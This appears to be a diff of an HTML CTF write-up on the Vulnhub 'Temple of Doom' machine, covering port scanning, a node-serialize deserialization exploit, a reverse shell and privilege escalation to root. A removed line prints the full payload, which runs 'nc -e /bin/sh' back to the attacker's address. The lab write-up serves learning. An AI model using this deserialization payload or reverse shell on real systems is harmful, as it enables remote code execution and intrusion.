@@ -151,7 +151,7 @@ margin-left: 50px;
   <p class="article-content">In this write up i am solving CTF challenge Temple of the doom. It was submitted on Vulnhub by 0katz.<br>
 Difficulty: Easy/intermediate<br>
 Link: https://www.vulnhub.com/<br>entry/temple-of-doom-1,243/
----------------------------------------------------------------<br>
+<br>
 Usually i am starting by scanning the ip of the machine but The ip was already exist so there was no need to scan upon it<br>
 <img src="ip.png" class="article-images"><br>
 So first i stated with scanning the open ports using nmap <br>
@@ -161,7 +161,7 @@ I checked the http website and there was nothing interesting
 <img src="website.png" class="article-images"><br>
 I tried to get the directories using wfuzz but i got nothing<br>
 <br>
-→Wfuzz -c -z file,/usr/share/wordlists/dirbuster-list-2.3-medium.txt — hc 404 http://192.168.1.109:666/FUZZ <br>
+→Wfuzz -c -z file,/usr/share/wordlists/<br>dirbuster-list-2.3-medium.txt — hc 404 http://192.168.1.109:666/FUZZ
 <br>
 Also tried to check if there is any vulnerabilities using nikto but also got nothing <br>
 <br>
@@ -193,14 +193,13 @@ So i started to google if there is any vulnerabilities published for node-serial
 
 and i found one
 <img src="google_search.png" class="article-images"><br>
+<br>
+<img src="payload.png" class="article-images"><br>
+
 i customized it a little bit so i can get shell
 and added it to the username parameter<br>
 <br>
-Payload:
-<br>
-{“username”:”_$$ND_FUNC$$_function(){return <br> require(‘child_process’).execSync(‘nc -e /bin/sh 192.168.1.106 1234’,<br>
-	(e,out,err)=>{console.log(out);}); }()”}fim
-<br>
+<img src="payload custimized.png" class="article-images"><br>
 <br>Then i encoded it and sent it to the server so i got a shell …
 <br>
 <img src="nodeadmin_shell.png" class="article-images"><br>
@@ -209,7 +208,7 @@ Payload:
 <br>I tried sudo -l to see if there’s services i can run as sudo but there wasn’t and <br> didn’t find any thing interesting in the home directory<br>
 <br> So in order to enumerate more i changed directory to /tmp and got Linenum.sh using
 
-<br>→git clone https://github.com/rebootuser/LinEnum.git
+<br>→git clone https://github.com/rebootuser/<br>LinEnum.git
 <br><img src="linenum_chmod.png" class="article-images"><br>
 
 <br>After i changed LinEnum.sh to executable i ran it and found that the user fireman can run sudo commands
@@ -266,6 +265,7 @@ I customized the command to give me root shell instead:
 <br>And i got root access...:)
 <br><img src="root_access.png" class="article-images"><br>
 
+</p>
 
 
 
